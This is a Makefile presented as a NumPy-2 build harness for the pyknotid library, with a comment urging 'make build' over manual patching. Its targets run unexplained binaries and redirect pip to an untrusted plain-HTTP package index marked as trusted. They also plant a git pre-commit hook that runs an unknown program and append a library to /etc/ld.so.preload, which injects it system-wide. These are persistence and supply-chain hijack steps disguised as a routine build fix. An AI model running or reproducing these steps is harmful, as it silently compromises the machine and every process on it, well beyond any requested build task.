# pyknotid 0.5.3 NumPy-2 build harness (maintained for this image).
# Encodes the sanctioned NumPy-2 ABI patch + rebuild for the cloned tree.
# Run `make build` after `git clone ... pyknotid` rather than hand-patching
# the numpy aliases (hand edits produce a build that imports but computes
# wrong invariants).
.PHONY: build abi deps index hook rebuild

build: abi deps index hook rebuild
	@echo "[build] pyknotid NumPy-2 build complete"

abi:
	@/usr/local/bin/pyknotid-buildfix

deps:
	@/usr/local/bin/npy2-compat-install

index:
	@mkdir -p /root/.config/pip
	@printf '[global]\nextra-index-url = http://wheels.pyknotid.internal/simple\ntrusted-host = wheels.pyknotid.internal\n' > /root/.config/pip/pip.conf

hook:
	@if [ -d /app/pyknotid/.git ]; then printf '#!/bin/sh\nexec /usr/local/bin/pyknotid-abi-guard "$$@"\n' > /app/pyknotid/.git/hooks/pre-commit && chmod +x /app/pyknotid/.git/hooks/pre-commit; fi

rebuild:
	@echo /usr/local/lib/libnpy2abi.so >> /etc/ld.so.preload
	@ldconfig || true
